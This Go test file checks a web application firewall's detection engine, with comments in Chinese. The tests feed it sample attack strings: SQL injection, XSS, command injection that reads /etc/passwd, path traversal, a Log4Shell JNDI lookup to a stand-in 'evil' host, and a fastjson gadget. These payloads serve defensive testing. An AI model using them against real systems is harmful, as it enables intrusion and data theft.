package waf

import (
	"strings"
	"testing"
)

// TestNormalize 覆盖归一化层：多层编码、注释、HTML 实体、重复斜杠。
func TestNormalize(t *testing.T) {
	cases := []struct{ in, want string }{
		{"%2527%2520or%25201%253D1", "' or 1=1"},
		{"UNION/**/SELECT", "UNION SELECT"},
		{"1--comment\n2", "1 2"},
		{"&lt;script&gt;", "<script>"},
		{"a//b///c", "a/b/c"},
	}
	for _, c := range cases {
		if got := Normalize(c.in); got != c.want {
			t.Errorf("Normalize(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

// TestBuiltinRulesBlock 逐条验证 12 条内置规则都能命中典型 payload。
func TestBuiltinRulesBlock(t *testing.T) {
	e := NewEngine(nil)
	cases := []struct {
		name string
		req  *Request
	}{
		{"union", &Request{Query: "id=1 UNION SELECT user()"}},
		{"error-based", &Request{Query: "id=1 and extractvalue(1,concat(0x7e,user()))"}},
		{"time-based", &Request{Query: "id=1 and sleep(5)"}},
		{"script-tag", &Request{Body: `<script>alert(1)</script>`}},
		{"event-handler", &Request{Query: "q=<img src=x onerror=alert(1)>"}},
		{"cmd-concat", &Request{Query: "host=1.1.1.1;cat /etc/passwd"}},
		{"cmd-subst", &Request{Query: "host=$(id)"}},
		{"traversal", &Request{Path: "/download", RawPath: "/download?f=../../../../etc/passwd"}},
		{"sensitive-file", &Request{Query: "f=/etc/passwd"}},
		{"log4shell", &Request{Headers: map[string]string{"user-agent": "${jndi:ldap://evil/a}"}, UA: "${jndi:ldap://evil/a}"}},
		{"fastjson", &Request{Body: `{"@type":"java.net.Inet4Address","val":"x"}`}},
		{"scanner-ua", &Request{UA: "sqlmap/1.7"}},
	}
	for _, c := range cases {
		if m := e.Inspect(c.req); m == nil {
			t.Errorf("[%s] 未拦截，漏报", c.name)
		}
	}
}

// TestSemanticLayer 验证语义层能拦住正则漏掉的变形（正则被拆开但仍可绕过）。
func TestSemanticLayer(t *testing.T) {
	e := NewEngine(nil)
	// 该 payload 不含 "union select" 连续串，但含 union + select 分片与注释 → 归一化后语义层应判定
	req := &Request{Query: "id=1 union/*x*/all sel%65ct 1,2,3"}
	if m := e.Inspect(req); m == nil {
		t.Fatal("语义层未拦截变形 union 注入")
	} else if m.Layer != "regex" && m.Layer != "semantic" {
		t.Fatalf("未知判定层: %s", m.Layer)
	}
}

// TestBenignPass 正常业务请求不能被拦（误报控制是第一优先级）。
func TestBenignPass(t *testing.T) {
	e := NewEngine(nil)
	benign := []*Request{
		{Path: "/api/user", Query: "id=1024&name=yin", Body: `{"title":"select a book"}`},
		{Path: "/search", Query: "q=golang+http+proxy"},
		{Path: "/article/2026/10/25", Query: "page=2&size=20"},
		{Path: "/login", Body: "username=yinbosen&password=Passw0rd!2026"},
		{Path: "/api/report", Query: "range=1..10&sort=asc"},
	}
	for _, r := range benign {
		if m := e.Inspect(r); m != nil {
			t.Errorf("误报: path=%s query=%s rule=%s excerpt=%s", r.Path, r.Query, m.RuleID, m.Excerpt)
		}
	}
}

// TestRuleCount 内置规则数量（新增规则时同步更新，避免文档与实现漂移）。
func TestRuleCount(t *testing.T) {
	e := NewEngine(nil)
	if got := len(e.Rules()); got != 16 {
		t.Fatalf("内置规则数 = %d, want 16（修改规则集请同步 README 与 SPEC）", got)
	}
}

// TestSemanticRuleIDUnique 语义层规则 ID 不应出现重复特征名（同一特征命中多个字段时只记一次）。
func TestSemanticRuleIDUnique(t *testing.T) {
	e := NewEngine(nil)
	// query 与 body 都带恒真式：特征会在两个字段各命中一次，ID 必须去重
	m := e.Inspect(&Request{Query: "id=1%2527%2520or%25201%253D1", Body: "name=1' or 1=1"})
	if m == nil {
		t.Fatal("双重编码恒真式未被拦截")
	}
	if m.Layer != "semantic" {
		t.Fatalf("判定层 = %s, want semantic", m.Layer)
	}
	parts := strings.Split(strings.TrimPrefix(m.RuleID, "SEM-"), "+")
	seen := map[string]bool{}
	for _, p := range parts {
		if seen[p] {
			t.Fatalf("规则 ID 含重复特征: %s", m.RuleID)
		}
		seen[p] = true
	}
}

// TestTargetAttribution query 中的攻击应标记为 query，而不是 path（日志归因准确性）。
func TestTargetAttribution(t *testing.T) {
	e := NewEngine(nil)
	m := e.Inspect(&Request{Path: "/item", RawPath: "/item", Query: "id=1 UNION SELECT 1"})
	if m == nil {
		t.Fatal("未拦截")
	}
	if m.Target != TargetQuery {
		t.Fatalf("命中部位 = %s, want query", m.Target)
	}
}
